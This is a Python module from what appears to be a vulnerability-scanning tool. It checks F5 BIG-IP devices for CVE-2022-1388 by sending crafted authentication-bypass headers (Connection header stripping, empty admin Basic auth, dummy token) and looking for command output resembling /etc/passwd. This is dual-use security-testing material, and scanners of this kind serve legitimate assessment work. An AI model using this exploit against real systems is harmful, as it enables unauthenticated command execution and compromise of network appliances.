#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
import re

def cve_2022_1388_scan(self, url):
    ''' 未经身份验证的攻击者可以通过管理端口或自身IP地址
            对BIG-IP系统进行网络访问, 执行任意系统命令、创建或删除文件或禁用服务
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    # vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_type'] = 'unAuth/RCE'
    vul_info['vul_id'] = 'CVE-2022-1388'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Connection': 'close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host',
        'Content-type': 'application/json',
        'Authorization': 'Basic YWRtaW46',
        'X-F5-Auth-Token': 'mouse'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2022_1388_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (('commandResult' in res.text) 
                and re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
